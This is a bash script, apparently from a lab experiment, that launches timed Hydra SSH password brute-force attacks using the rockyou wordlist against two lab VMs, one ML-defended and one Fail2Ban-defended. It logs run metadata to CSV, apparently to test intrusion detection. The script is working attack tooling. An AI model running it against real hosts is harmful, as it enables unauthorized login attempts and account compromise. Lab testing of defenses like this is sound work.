#!/usr/bin/env bash
set -euo pipefail

# Simple dual-target Hydra runner for QoS / stress testing
# Run on attacker VM. Only use in your lab (authorized targets).

### ===== CONFIG - edit sesuai lingkunganmu =====
VICTIM1="192.168.67.12"         # VM victim 1 (ML)
VICTIM2="192.168.67.13"         # VM victim 2 (Fail2Ban)
ATTACKER_IP="192.168.67.67"
OUTBASE="/home/pros/test_results/accuracy/silent"
RUN_DURATION=300                # detik, berapa lama serangan berjalan
HYDRA_USER="victim"
HYDRA_WORDLIST="/home/pros/rockyou.txt"
HYDRA_THREADS=2                 # jumlah threads hydra per target
CHRONYC_BIN="$(command -v chronyc || true)"
### ============================================

mkdir -p "$OUTBASE"

# create header if not exist (no epoch columns since we skip detection parsing)
ATTACKS_CSV="$OUTBASE/attacks_log.csv"
if [ ! -f "$ATTACKS_CSV" ]; then
  echo "attack_id,attacker_ip,target1,target2,duration_s,threads,start_epoch,end_epoch,notes" > "$ATTACKS_CSV"
fi

# generate run id (att_light_stress_N)
PREFIX="accuracy_silent"
i=1
while [ -d "$OUTBASE/${PREFIX}_${i}" ]; do
  i=$((i+1))
done
ATTACK_ID="${PREFIX}_${i}"
RUNDIR="$OUTBASE/$ATTACK_ID"
mkdir -p "$RUNDIR"

echo "[INFO] Attack run id: $ATTACK_ID"
echo "[INFO] Output dir: $RUNDIR"
echo "[INFO] Duration: ${RUN_DURATION}s ; threads: ${HYDRA_THREADS}"

# try sync time (best effort)
if [ -n "$CHRONYC_BIN" ]; then
  echo "[TIME] Attempting chrony makestep..."
  $CHRONYC_BIN tracking >/dev/null 2>&1 || true
  $CHRONYC_BIN makestep >/dev/null 2>&1 || true
fi

START_EPOCH="$(printf "%.6f" "$(date -u +%s.%N)")"
{
  echo "attack_id,${ATTACK_ID}"
  echo "attacker_ip,${ATTACKER_IP}"
  echo "target1,${VICTIM1}"
  echo "target2,${VICTIM2}"
  echo "duration_s,${RUN_DURATION}"
  echo "threads,${HYDRA_THREADS}"
  echo "start_epoch,${START_EPOCH}"
} > "$RUNDIR/metadata.txt"

HYDRA_OUT1="$RUNDIR/hydra_t1.txt"
HYDRA_OUT2="$RUNDIR/hydra_t2.txt"

echo "[ATTACK] Starting Hydra on $VICTIM1 and $VICTIM2 (background)..."
timeout "${RUN_DURATION}s" hydra -l "$HYDRA_USER" -P "$HYDRA_WORDLIST" -t "$HYDRA_THREADS" ssh://"${VICTIM1}" > "$HYDRA_OUT1" 2>&1 &
PID1=$!
timeout "${RUN_DURATION}s" hydra -l "$HYDRA_USER" -P "$HYDRA_WORDLIST" -t "$HYDRA_THREADS" ssh://"${VICTIM2}" > "$HYDRA_OUT2" 2>&1 &
PID2=$!

echo "[ATTACK] Hydra PIDs: $PID1 , $PID2"
# wait both to finish (timeout will kill them)
wait $PID1 2>/dev/null || true
wait $PID2 2>/dev/null || true

END_EPOCH="$(printf "%.6f" "$(date -u +%s.%N)")"
echo "end_epoch,${END_EPOCH}" >> "$RUNDIR/metadata.txt"

# small delay for outputs flush
sleep 2

# ----------------- WRITE SUMMARY -----------------
echo "attack_id,${ATTACK_ID}" > "$RUNDIR/summary.txt"
echo "attacker_ip,${ATTACKER_IP}" >> "$RUNDIR/summary.txt"
echo "target1,${VICTIM1}" >> "$RUNDIR/summary.txt"
echo "target2,${VICTIM2}" >> "$RUNDIR/summary.txt"
echo "start_epoch,${START_EPOCH}" >> "$RUNDIR/summary.txt"
echo "end_epoch,${END_EPOCH}" >> "$RUNDIR/summary.txt"

# Append to global CSV (no detection/ban epochs)
echo "${ATTACK_ID},${ATTACKER_IP},${VICTIM1},${VICTIM2},${RUN_DURATION},${HYDRA_THREADS},${START_EPOCH},${END_EPOCH},\"qos-stress\"" >> "$ATTACKS_CSV"

echo "[DONE] Run completed. Summary saved to $RUNDIR/summary.txt"
echo "[DONE] Global log appended: $ATTACKS_CSV"
echo "[INFO] Hydra outputs: $HYDRA_OUT1 , $HYDRA_OUT2"

# show short preview
echo "---- summary ----"
cat "$RUNDIR/summary.txt"
